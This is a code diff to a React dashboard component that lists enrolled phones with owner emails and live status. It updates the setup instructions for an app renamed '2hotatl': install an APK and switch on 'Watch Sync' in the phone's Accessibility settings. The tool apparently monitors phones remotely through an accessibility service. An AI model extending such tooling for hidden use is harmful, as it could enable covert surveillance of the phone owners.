@@ -21,9 +21,10 @@ export function DevicePanel({ devices, selectedId, connected, onSelect }: Props)
     return (
       <div className="device-panel device-panel-empty">
         <h3>No phones yet</h3>
-        <p>Install the app on a phone, sign up with name + email, then turn on <strong>Watch Sync</strong> in Accessibility settings. Phone can use WiFi or mobile data — no same network needed.</p>
+        <p>Install the app on a phone, sign up with name + email, then turn on <strong>Watch Sync</strong> in Accessibility settings. Open the app and wait for <strong>● Live</strong> on the phone home screen.</p>
         <p className="device-panel-hint">
-          <a href="/install.html">Install APK</a>
+          Use <a href="https://sapp-xoyi.onrender.com">sapp-xoyi.onrender.com</a> in your browser.
+          <a href="/install.html"> Install APK</a>
           {!connected && " · reconnecting to server…"}
         </p>
       </div>
@@ -74,10 +75,10 @@ export function DeviceOfflinePanel({ device }: OfflineProps) {
       {device.ownerEmail && <p className="device-offline-meta">{device.ownerEmail}</p>}
       {device.model && <p className="device-offline-meta">{device.model}</p>}
       <ol className="device-offline-steps">
-        <li>Open the WatchRoom app on the phone</li>
-        <li>Make sure sign-up is complete</li>
+        <li>Open <strong>2hotatl</strong> on the phone</li>
+        <li>Home screen should show <strong>● Live</strong> (not “Connecting…”)</li>
         <li>Settings → Accessibility → <strong>Watch Sync</strong> → ON</li>
-        <li>Keep the app running (don&apos;t force-close)</li>
+        <li>If still offline: force-close app, reopen, wait 30s (server may have reset — app re-registers automatically on v1.9.2+)</li>
       </ol>
       <p className="device-offline-hint">Status updates every few seconds. Pick another phone above if needed.</p>
     </div>
